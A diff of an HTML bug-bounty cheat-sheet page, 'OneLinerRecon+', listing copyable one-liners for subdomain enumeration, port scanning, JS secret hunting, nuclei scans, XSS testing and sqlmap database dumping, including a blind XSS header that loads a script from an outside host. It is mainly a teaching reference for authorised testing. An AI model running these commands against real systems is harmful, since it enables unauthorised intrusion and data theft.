@@ -3,18 +3,431 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" href="style.css" />
+  <title>OneLinerRecon+ | Bug Bounty Toolkit</title>
+  <style>
+    :root {
+      --bg: #0d0d0f;
+      --bg-alt: #111114;
+      --card-bg: #16161a;
+      --card-border: #2a2a30;
+      --red: #e03c3c;
+      --red-dim: #c0313175;
+      --green: #39d98a;
+      --blue: #4fa3e0;
+      --yellow: #f5c842;
+      --purple: #a78bfa;
+      --orange: #fb923c;
+      --cyan: #22d3ee;
+      --text: #e8e8ef;
+      --muted: #888895;
+      --code-bg: #0a0a0c;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    /* Scrollbar */
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+
+    /* NAV */
+    .nav {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: rgba(13,13,15,0.95);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--card-border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 24px;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .nav-logo {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--red);
+      letter-spacing: 1px;
+      white-space: nowrap;
+      text-shadow: 0 0 20px var(--red-dim);
+    }
+
+    .nav-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+    }
+
+    .nav-links a {
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 11px;
+      padding: 3px 8px;
+      border-radius: 4px;
+      border: 1px solid transparent;
+      transition: all 0.2s;
+    }
+
+    .nav-links a:hover {
+      color: var(--text);
+      border-color: var(--card-border);
+      background: var(--card-bg);
+    }
+
+    /* SEARCH BAR */
+    .search-bar {
+      background: var(--bg-alt);
+      border-bottom: 1px solid var(--card-border);
+      padding: 10px 24px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .search-bar input {
+      flex: 1;
+      background: var(--code-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 6px;
+      padding: 7px 14px;
+      color: var(--text);
+      font-family: inherit;
+      font-size: 13px;
+      outline: none;
+      transition: border-color 0.2s;
+      max-width: 480px;
+    }
+
+    .search-bar input:focus { border-color: var(--red); }
+    .search-bar input::placeholder { color: var(--muted); }
+    .search-count { font-size: 12px; color: var(--muted); }
+
+    /* HERO */
+    .hero {
+      text-align: center;
+      padding: 72px 24px 56px;
+      background: radial-gradient(ellipse 60% 40% at 50% 0%, #e03c3c12 0%, transparent 70%);
+      border-bottom: 1px solid var(--card-border);
+    }
+
+    .badge {
+      display: inline-block;
+      background: var(--red-dim);
+      border: 1px solid var(--red);
+      color: var(--red);
+      font-size: 11px;
+      padding: 3px 12px;
+      border-radius: 100px;
+      margin-bottom: 16px;
+      letter-spacing: 1px;
+    }
+
+    .hero h1 {
+      font-size: clamp(24px, 4vw, 42px);
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 16px;
+      letter-spacing: -1px;
+    }
+
+    .hero h1 span { color: var(--red); }
+
+    .hero-text {
+      color: var(--muted);
+      max-width: 620px;
+      margin: 0 auto 28px;
+      font-family: sans-serif;
+      font-size: 15px;
+    }
+
+    .hero-actions { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+
+    .btn {
+      display: inline-block;
+      padding: 9px 20px;
+      border-radius: 6px;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      cursor: pointer;
+      text-decoration: none;
+      transition: all 0.2s;
+      border: 1px solid transparent;
+    }
+
+    .btn-primary { background: var(--red); color: #fff; }
+    .btn-primary:hover { background: #c93535; box-shadow: 0 0 20px var(--red-dim); }
+    .btn-secondary { background: transparent; border-color: var(--card-border); color: var(--text); }
+    .btn-secondary:hover { border-color: var(--red); color: var(--red); }
+    .btn-outline { background: transparent; border-color: var(--card-border); color: var(--muted); font-size: 12px; }
+    .btn-outline:hover { border-color: var(--red); color: var(--red); }
+
+    .hero-note {
+      margin-top: 20px;
+      font-size: 11px;
+      color: #e03c3c88;
+    }
+
+    /* STATS BAR */
+    .stats-bar {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 32px;
+      padding: 20px 24px;
+      border-bottom: 1px solid var(--card-border);
+      background: var(--bg-alt);
+    }
+
+    .stat { text-align: center; }
+    .stat-num { font-size: 22px; font-weight: 700; color: var(--red); }
+    .stat-label { font-size: 11px; color: var(--muted); margin-top: 2px; }
+
+    /* SECTIONS */
+    .section { padding: 48px 24px; max-width: 1300px; margin: 0 auto; }
+    .section.alt { background: transparent; }
+
+    .section-header { margin-bottom: 28px; }
+    .section-header h2 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .section-header h2::before {
+      content: '';
+      display: inline-block;
+      width: 4px;
+      height: 22px;
+      background: var(--red);
+      border-radius: 2px;
+    }
+
+    .section-header p { color: var(--muted); font-family: sans-serif; font-size: 13px; }
+
+    .section-divider {
+      border: none;
+      border-top: 1px solid var(--card-border);
+      margin: 0 24px;
+    }
+
+    /* GRID */
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 16px;
+    }
+
+    .grid-2 {
+      grid-template-columns: repeat(auto-fill, minmax(420px, 1fr));
+    }
+
+    /* CARD */
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 10px;
+      padding: 18px;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .card:hover {
+      border-color: #404048;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.4);
+    }
+
+    .card-red { border-left: 3px solid var(--red); }
+    .card-green { border-left: 3px solid var(--green); }
+    .card-blue { border-left: 3px solid var(--blue); }
+    .card-yellow { border-left: 3px solid var(--yellow); }
+    .card-purple { border-left: 3px solid var(--purple); }
+    .card-orange { border-left: 3px solid var(--orange); }
+    .card-cyan { border-left: 3px solid var(--cyan); }
+
+    .card-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      flex-wrap: wrap;
+      gap: 6px;
+    }
+
+    .card-head h3 {
+      font-size: 14px;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    .card > p, .card > .card-head + p {
+      color: var(--muted);
+      font-size: 12px;
+      font-family: sans-serif;
+      margin-bottom: 10px;
+    }
+
+    .chip {
+      font-size: 10px;
+      padding: 2px 8px;
+      background: #1e1e24;
+      border: 1px solid var(--card-border);
+      border-radius: 100px;
+      color: var(--muted);
+      white-space: nowrap;
+    }
+
+    /* SEVERITY CHIPS */
+    .chip-critical { background: #e03c3c22; border-color: var(--red); color: var(--red); }
+    .chip-high { background: #fb923c22; border-color: var(--orange); color: var(--orange); }
+    .chip-medium { background: #f5c84222; border-color: var(--yellow); color: var(--yellow); }
+    .chip-low { background: #22d3ee22; border-color: var(--cyan); color: var(--cyan); }
+    .chip-info { background: #4fa3e022; border-color: var(--blue); color: var(--blue); }
+
+    /* CODE BLOCK */
+    .code-wrap {
+      position: relative;
+      margin-top: 6px;
+    }
+
+    pre {
+      background: var(--code-bg);
+      border: 1px solid #222228;
+      border-radius: 6px;
+      padding: 10px 36px 10px 12px;
+      overflow-x: auto;
+      margin-top: 6px;
+    }
+
+    pre code {
+      color: #a8d8a8;
+      font-size: 12px;
+      font-family: 'Courier New', monospace;
+      white-space: pre;
+    }
+
+    .copy-btn {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      background: #1e1e24;
+      border: 1px solid var(--card-border);
+      color: var(--muted);
+      font-size: 10px;
+      padding: 2px 7px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-family: monospace;
+      transition: all 0.15s;
+    }
+
+    .copy-btn:hover { color: var(--green); border-color: var(--green); }
+    .copy-btn.copied { color: var(--green); border-color: var(--green); }
+
+    /* CATEGORY FOOTER */
+    .category-footer {
+      margin-top: 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    /* TAGS */
+    .tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-bottom: 10px;
+    }
+
+    .tag {
+      font-size: 10px;
+      padding: 1px 7px;
+      background: #1a1a20;
+      border-radius: 4px;
+      color: var(--muted);
+      border: 1px solid #2a2a30;
+    }
+
+    /* HIDDEN for search filter */
+    .card.hidden { display: none; }
+    .section.all-hidden { display: none; }
+
+    /* JUMP TO TOP */
+    #jump-top {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      background: var(--red);
+      color: #fff;
+      border: none;
+      border-radius: 50%;
+      width: 42px;
+      height: 42px;
+      font-size: 18px;
+      cursor: pointer;
+      opacity: 0;
+      transition: opacity 0.3s, box-shadow 0.2s;
+      z-index: 200;
+      pointer-events: none;
+    }
+
+    #jump-top.show { opacity: 1; pointer-events: all; }
+    #jump-top:hover { box-shadow: 0 0 20px var(--red-dim); }
+
+    /* FOOTER */
+    .footer {
+      text-align: center;
+      padding: 32px;
+      border-top: 1px solid var(--card-border);
+      color: var(--muted);
+      font-size: 12px;
+      font-family: sans-serif;
+    }
+
+    .footer span { color: var(--red); }
+
+    @media (max-width: 600px) {
+      .nav-links { display: none; }
+      .grid-2 { grid-template-columns: 1fr; }
+    }
+  </style>
 </head>
 <body>
-  <!-- Navigation -->
+
+  <!-- NAV -->
   <header class="nav">
-    <div class="nav-logo">OneLinerRecon+ </div>
+    <div class="nav-logo">OneLinerRecon+</div>
     <nav class="nav-links">
       <a href="#subdomain">Subdomains</a>
       <a href="#asn">ASN & IP</a>
+      <a href="#portscan">Port Scan</a>
       <a href="#live-hosts">Live Hosts</a>
       <a href="#urls">URLs</a>
       <a href="#vuln">Vulns</a>
+      <a href="#xss">XSS</a>
+      <a href="#sqli">SQLi</a>
+      <a href="#ssrf">SSRF</a>
+      <a href="#lfi">LFI/RFI</a>
+      <a href="#openredirect">Open Redirect</a>
+      <a href="#jwt">JWT</a>
+      <a href="#api">API Recon</a>
+      <a href="#cloud">Cloud</a>
       <a href="#sensitive">Sensitive Files</a>
       <a href="#hidden">Hidden Params</a>
       <a href="#dir">Dirs & Files</a>
@@ -24,400 +437,821 @@
     </nav>
   </header>
 
-  <!-- Hero -->
+  <!-- SEARCH BAR -->
+  <div class="search-bar">
+    <input type="text" id="searchInput" placeholder="🔍  Search commands, tools, techniques..." />
+    <span class="search-count" id="searchCount"></span>
+  </div>
+
+  <!-- HERO -->
   <section class="hero">
-    <div class="hero-inner">
-      <p class="badge">Bug Bounty · Recon to Exploit</p>
-      <h1>One‑Liner Recon & Exploit Toolkit</h1>
-      <p class="hero-text">
-        All‑in‑one recon cheat‑sheet for subdomains, ASN, live hosts, URLs, vulnerabilities, sensitive files,
-        directories, WordPress, CORS and advanced Google Dorks. Copy, paste, and hack responsibly.
-      </p>
-      <div class="hero-actions">
-        <a href="#subdomain" class="btn btn-primary">Start Recon</a>
-        <a href="#dorks" class="btn btn-secondary">Jump to Dorks</a>
-      </div>
-      <p class="hero-note">
-        Use only on targets where you have explicit permission. You are responsible for your actions.
-      </p>
+    <p class="badge">Bug Bounty · Recon to Exploit</p>
+    <h1>One‑Liner <span>Recon</span> & Exploit Toolkit</h1>
+    <p class="hero-text">
+      All‑in‑one recon cheat‑sheet for subdomains, ASN, ports, live hosts, URLs, XSS, SQLi, SSRF, JWT, API recon,
+      cloud buckets, CORS, and advanced Google Dorks. Copy, paste, and hack responsibly.
+    </p>
+    <div class="hero-actions">
+      <a href="#subdomain" class="btn btn-primary">Start Recon</a>
+      <a href="#dorks" class="btn btn-secondary">Jump to Dorks</a>
     </div>
+    <p class="hero-note">⚠️ Use only on targets where you have explicit permission. You are responsible for your actions.</p>
   </section>
 
-  <!-- Subdomain Enumeration -->
-  <section id="subdomain" class="section">
+  <!-- STATS BAR -->
+  <div class="stats-bar">
+    <div class="stat"><div class="stat-num">90+</div><div class="stat-label">One-Liners</div></div>
+    <div class="stat"><div class="stat-num">20+</div><div class="stat-label">Sections</div></div>
+    <div class="stat"><div class="stat-num">30+</div><div class="stat-label">Tools Covered</div></div>
+    <div class="stat"><div class="stat-num">∞</div><div class="stat-label">Bugs Found</div></div>
+  </div>
+
+  <!-- SUBDOMAIN ENUMERATION -->
+  <section id="subdomain" class="section" data-section>
     <div class="section-header">
       <h2>Subdomain Enumeration</h2>
       <p>Discover subdomains using passive and active techniques and detect takeover opportunities.</p>
     </div>
     <div class="grid">
-      <div class="card card-red">
-        <div class="card-head">
-          <h3>Passive Subdomains</h3>
-          <span class="chip">Subfinder</span>
-        </div>
+
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>Passive Subdomains</h3><span class="chip">subfinder</span></div>
         <p>Collect subdomains using passive sources only.</p>
-        <pre><code>subfinder -d example.com -silent</code></pre>
+        <div class="code-wrap"><pre><code>subfinder -d example.com -silent</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card card-red">
-        <div class="card-head">
-          <h3>Active (Permutation) Subdomains</h3>
-          <span class="chip">puredns</span>
-        </div>
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>Multi-Source Passive</h3><span class="chip">amass</span></div>
+        <p>Use amass with all passive sources for maximum coverage.</p>
+        <div class="code-wrap"><pre><code>amass enum -passive -d example.com -o subs.txt</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>Active (Permutation)</h3><span class="chip">puredns</span></div>
         <p>Bruteforce permutations using a large wordlist.</p>
-        <pre><code>puredns bruteforce -d example.com -w /wordlists/all.txt</code></pre>
+        <div class="code-wrap"><pre><code>puredns bruteforce -d example.com -w /wordlists/all.txt</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card card-red">
-        <div class="card-head">
-          <h3>Subdomains &amp; Takeover Check</h3>
-          <span class="chip">subfinder + subjack</span>
-        </div>
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>Subdomain Takeover Check</h3><span class="chip">subfinder + subjack</span></div>
         <p>Find subdomains and check for potential takeovers.</p>
-        <pre><code>subfinder -d example.com | subjack -w fingerprint.txt -t 100</code></pre>
+        <div class="code-wrap"><pre><code>subfinder -d example.com | subjack -w fingerprint.txt -t 100</code></pre><button class="copy-btn">copy</button></div>
       </div>
-    </div>
-    <div class="category-footer">
-      <button class="btn btn-outline">Just Hack 🤓</button>
-    </div>
-  </section>
 
-  <!-- ASN & IP Discovery -->
-  <section id="asn" class="section alt">
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>Subdomain Takeover (nuclei)</h3><span class="chip">nuclei</span></div>
+        <p>Check all subs for CNAME-based takeover with nuclei templates.</p>
+        <div class="code-wrap"><pre><code>cat subs.txt | nuclei -t takeovers/ -silent</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>DNS Zone Transfer</h3><span class="chip">dig</span></div>
+        <p>Attempt AXFR zone transfer to dump all DNS records.</p>
+        <div class="code-wrap"><pre><code>dig axfr @ns1.example.com example.com</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- ASN & IP -->
+  <section id="asn" class="section" data-section>
     <div class="section-header">
       <h2>ASN &amp; IP Discovery</h2>
       <p>Map organizational ownership and resolve domains to IPs.</p>
     </div>
     <div class="grid">
-      <div class="card">
-        <div class="card-head">
-          <h3>ASN &amp; IP Info (Whois)</h3>
-          <span class="chip">whois</span>
-        </div>
+
+      <div class="card card-blue" data-card>
+        <div class="card-head"><h3>ASN &amp; CIDR (Whois)</h3><span class="chip">whois</span></div>
         <p>Get ASN, CIDR and organization information.</p>
-        <pre><code>whois example.com | grep -E "CIDR|AS Name|OrgName"</code></pre>
+        <div class="code-wrap"><pre><code>whois example.com | grep -E "CIDR|AS Name|OrgName"</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card">
-        <div class="card-head">
-          <h3>Resolve to IP</h3>
-          <span class="chip">resolveip</span>
-        </div>
-        <p>Resolve domain to IP address.</p>
-        <pre><code>echo example.com | resolveip</code></pre>
+      <div class="card card-blue" data-card>
+        <div class="card-head"><h3>IP Range from ASN</h3><span class="chip">whois + grep</span></div>
+        <p>Pull all CIDR ranges associated with an ASN.</p>
+        <div class="code-wrap"><pre><code>whois -h whois.radb.net -- '-i origin AS12345' | grep -E "^route:"</code></pre><button class="copy-btn">copy</button></div>
       </div>
-    </div>
-    <div class="category-footer">
-      <button class="btn btn-outline">Just Hack 🤓</button>
-    </div>
-  </section>
 
-  <!-- Live Host Discovery -->
-  <section id="live-hosts" class="section">
+      <div class="card card-blue" data-card>
+        <div class="card-head"><h3>Resolve to IP</h3><span class="chip">dig</span></div>
+        <p>Resolve domain to all A records.</p>
+        <div class="code-wrap"><pre><code>dig +short A example.com</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-blue" data-card>
+        <div class="card-head"><h3>Reverse DNS Lookup</h3><span class="chip">dig</span></div>
+        <p>Find hostname associated with an IP address.</p>
+        <div class="code-wrap"><pre><code>dig +short -x 1.2.3.4</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- PORT SCANNING -->
+  <section id="portscan" class="section" data-section>
+    <div class="section-header">
+      <h2>Port Scanning</h2>
+      <p>Fast and stealthy port enumeration with service detection.</p>
+    </div>
+    <div class="grid">
+
+      <div class="card card-orange" data-card>
+        <div class="card-head"><h3>Fast Full Port Scan</h3><span class="chip">naabu</span></div>
+        <p>Scan all 65535 ports rapidly.</p>
+        <div class="code-wrap"><pre><code>naabu -host example.com -p - -silent</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-orange" data-card>
+        <div class="card-head"><h3>Service Version Detection</h3><span class="chip">nmap</span></div>
+        <p>Detect services and versions on common ports.</p>
+        <div class="code-wrap"><pre><code>nmap -sV -sC -p 80,443,8080,8443,22,21,3306 example.com</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-orange" data-card>
+        <div class="card-head"><h3>Stealth SYN Scan</h3><span class="chip">nmap</span></div>
+        <p>Run stealth SYN scan to avoid detection.</p>
+        <div class="code-wrap"><pre><code>nmap -sS -T2 -p- --min-rate=300 example.com</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-orange" data-card>
+        <div class="card-head"><h3>Ping Sweep (IP Range)</h3><span class="chip">nmap</span></div>
+        <p>Discover live hosts within an IP range.</p>
+        <div class="code-wrap"><pre><code>nmap -sP 192.168.1.0/24 -oG - | grep Up</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- LIVE HOSTS -->
+  <section id="live-hosts" class="section" data-section>
     <div class="section-header">
       <h2>Live Host Discovery</h2>
       <p>Identify live URLs and IPs to focus your attacks.</p>
     </div>
     <div class="grid">
-      <div class="card">
-        <div class="card-head">
-          <h3>Probe for Live URLs</h3>
-          <span class="chip">httpx</span>
-        </div>
+
+      <div class="card" data-card>
+        <div class="card-head"><h3>Probe for Live URLs</h3><span class="chip">httpx</span></div>
         <p>Probe subdomains for live web services.</p>
-        <pre><code>cat subdomains.txt | httpx -silent -title -webserver</code></pre>
+        <div class="code-wrap"><pre><code>cat subdomains.txt | httpx -silent -title -webserver</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card">
-        <div class="card-head">
-          <h3>Live IPs (Scan)</h3>
-          <span class="chip">nmap</span>
-        </div>
-        <p>Ping sweep over a list of IPs.</p>
-        <pre><code>nmap -sP -iL ip_list.txt</code></pre>
+      <div class="card" data-card>
+        <div class="card-head"><h3>Status Code Filter</h3><span class="chip">httpx</span></div>
+        <p>Filter only 200 OK responses with tech stack info.</p>
+        <div class="code-wrap"><pre><code>cat subs.txt | httpx -mc 200 -tech-detect -silent</code></pre><button class="copy-btn">copy</button></div>
       </div>
-    </div>
-    <div class="category-footer">
-      <button class="btn btn-outline">Just Hack 🤓</button>
-    </div>
-  </section>
 
-  <!-- URL Collection & Analysis -->
-  <section id="urls" class="section alt">
+      <div class="card" data-card>
+        <div class="card-head"><h3>Screenshot Live Hosts</h3><span class="chip">gowitness</span></div>
+        <p>Take screenshots of all live HTTP services.</p>
+        <div class="code-wrap"><pre><code>gowitness file -f live_hosts.txt --screenshot-path ./shots/</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- URL COLLECTION -->
+  <section id="urls" class="section" data-section>
     <div class="section-header">
       <h2>URL Collection &amp; Analysis</h2>
       <p>Harvest historical URLs, parameterized endpoints and JS‑exposed paths.</p>
     </div>
     <div class="grid">
-      <div class="card">
-        <div class="card-head">
-          <h3>From Wayback Machine</h3>
-          <span class="chip">waybackurls</span>
-        </div>
+
+      <div class="card" data-card>
+        <div class="card-head"><h3>Wayback Machine URLs</h3><span class="chip">waybackurls</span></div>
         <p>Grab archived URLs and filter non‑static assets.</p>
-        <pre><code>waybackurls example.com | grep -v "jpg\\|png\\|gif" | sort -u</code></pre>
+        <div class="code-wrap"><pre><code>waybackurls example.com | grep -v "jpg\|png\|gif" | sort -u</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card">
-        <div class="card-head">
-          <h3>URLs with Parameters</h3>
-          <span class="chip">grep</span>
-        </div>
+      <div class="card" data-card>
+        <div class="card-head"><h3>URLs with Parameters</h3><span class="chip">grep</span></div>
         <p>Extract URLs containing parameters for further testing.</p>
-        <pre><code>cat urls.txt | grep "=" | sort -u</code></pre>
+        <div class="code-wrap"><pre><code>cat urls.txt | grep "=" | sort -u</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card">
-        <div class="card-head">
-          <h3>Endpoints from JS Files</h3>
-          <span class="chip">getallurls</span>
-        </div>
+      <div class="card" data-card>
+        <div class="card-head"><h3>Endpoints from JS Files</h3><span class="chip">getallurls</span></div>
         <p>Pull endpoints leaked inside JavaScript files.</p>
-        <pre><code>subfinder -d example.com | getallurls -js | sort -u</code></pre>
+        <div class="code-wrap"><pre><code>subfinder -d example.com | getallurls -js | sort -u</code></pre><button class="copy-btn">copy</button></div>
       </div>
-    </div>
-    <div class="category-footer">
-      <button class="btn btn-outline">Just Hack 🤓</button>
-    </div>
-  </section>
 
-  <!-- Vulnerability Scanning -->
-  <section id="vuln" class="section">
+      <div class="card" data-card>
+        <div class="card-head"><h3>Extract JS Files</h3><span class="chip">gau + grep</span></div>
+        <p>Collect all JavaScript files from multiple sources.</p>
+        <div class="code-wrap"><pre><code>gau example.com | grep "\.js$" | sort -u | tee js_files.txt</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card" data-card>
+        <div class="card-head"><h3>Secrets in JS Files</h3><span class="chip">secretfinder</span></div>
+        <p>Hunt for API keys and secrets in JS files.</p>
+        <div class="code-wrap"><pre><code>cat js_files.txt | xargs -I{} python3 SecretFinder.py -i {} -o cli</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card" data-card>
+        <div class="card-head"><h3>Crawl &amp; Spider</h3><span class="chip">katana</span></div>
+        <p>Modern JS-aware crawling with form extraction.</p>
+        <div class="code-wrap"><pre><code>katana -u https://example.com -jc -d 3 -silent</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- VULN SCANNING -->
+  <section id="vuln" class="section" data-section>
     <div class="section-header">
       <h2>Vulnerability Scanning</h2>
       <p>Quick, low‑noise vulnerability checks for common issues.</p>
     </div>
     <div class="grid">
-      <div class="card">
-        <div class="card-head">
-          <h3>Low‑Severity Scan</h3>
-          <span class="chip">nuclei</span>
-        </div>
-        <p>Run nuclei templates for default logins and misconfigurations.</p>
-        <pre><code>nuclei -l urls.txt -t default-logins.yaml</code></pre>
+
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>Nuclei - Full Scan</h3><span class="chip chip-critical">nuclei</span></div>
+        <p>Run all nuclei templates on a target list.</p>
+        <div class="code-wrap"><pre><code>nuclei -l urls.txt -t nuclei-templates/ -severity critical,high -silent</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card">
-        <div class="card-head">
-          <h3>LFI Payload Fuzzing</h3>
-          <span class="chip">ffuf</span>
-        </div>
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>Default Logins</h3><span class="chip chip-high">nuclei</span></div>
+        <p>Run nuclei templates for default login panels.</p>
+        <div class="code-wrap"><pre><code>nuclei -l urls.txt -t default-logins/ -silent</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>Exposed Panels</h3><span class="chip chip-medium">nuclei</span></div>
+        <p>Detect admin, monitoring, and login panels.</p>
+        <div class="code-wrap"><pre><code>nuclei -l urls.txt -t exposures/panels/ -silent</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- XSS TESTING -->
+  <section id="xss" class="section" data-section>
+    <div class="section-header">
+      <h2>XSS Testing</h2>
+      <p>Detect reflected, stored and DOM-based cross-site scripting vulnerabilities.</p>
+    </div>
+    <div class="grid">
+
+      <div class="card card-yellow" data-card>
+        <div class="card-head"><h3>Reflected XSS (dalfox)</h3><span class="chip chip-high">dalfox</span></div>
+        <p>Automated XSS scan with parameter mining.</p>
+        <div class="code-wrap"><pre><code>dalfox url "https://example.com/search?q=test" --silence</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-yellow" data-card>
+        <div class="card-head"><h3>Bulk URL XSS Scan</h3><span class="chip chip-high">dalfox</span></div>
+        <p>Pipe parameterized URLs into dalfox for mass scanning.</p>
+        <div class="code-wrap"><pre><code>cat params_urls.txt | dalfox pipe --silence</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-yellow" data-card>
+        <div class="card-head"><h3>XSS via Wayback URLs</h3><span class="chip chip-high">gxss</span></div>
+        <p>Test historical URLs for reflection-based XSS.</p>
+        <div class="code-wrap"><pre><code>waybackurls example.com | gxss -c 100 | dalfox pipe</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-yellow" data-card>
+        <div class="card-head"><h3>DOM XSS via Katana</h3><span class="chip chip-medium">katana + grep</span></div>
+        <p>Find potential DOM XSS sinks in crawled pages.</p>
+        <div class="code-wrap"><pre><code>katana -u https://example.com -jc | grep -E "innerHTML|document\.write|eval\("</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-yellow" data-card>
+        <div class="card-head"><h3>Blind XSS Headers</h3><span class="chip chip-high">curl</span></div>
+        <p>Inject blind XSS payload in HTTP headers.</p>
+        <div class="code-wrap"><pre><code>curl -s "https://example.com" -H 'User-Agent: "><script src=//your.xss.ht></script>'</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- SQL INJECTION -->
+  <section id="sqli" class="section" data-section>
+    <div class="section-header">
+      <h2>SQL Injection</h2>
+      <p>Detect and exploit SQL injection vulnerabilities with automated and manual techniques.</p>
+    </div>
+    <div class="grid">
+
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>SQLMap Basic Scan</h3><span class="chip chip-critical">sqlmap</span></div>
+        <p>Run sqlmap on a single URL with GET parameter.</p>
+        <div class="code-wrap"><pre><code>sqlmap -u "https://example.com/item?id=1" --dbs --batch</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>SQLi via POST Body</h3><span class="chip chip-critical">sqlmap</span></div>
+        <p>Test POST parameters for SQLi with form data.</p>
+        <div class="code-wrap"><pre><code>sqlmap -u "https://example.com/login" --data="user=a&pass=b" --dbs --batch</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>Bulk SQLi Detection</h3><span class="chip chip-critical">sqlmap</span></div>
+        <p>Feed parameterized URLs from gau/wayback into sqlmap.</p>
+        <div class="code-wrap"><pre><code>gau example.com | grep "=" | sqlmap -m /dev/stdin --batch --level=3</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>Error-Based SQLi Detection</h3><span class="chip chip-high">grep</span></div>
+        <p>Send a single quote and grep for SQL errors in response.</p>
+        <div class="code-wrap"><pre><code>curl -s "https://example.com/item?id=1'" | grep -iE "sql|mysql|syntax|warning|error"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- SSRF TESTING -->
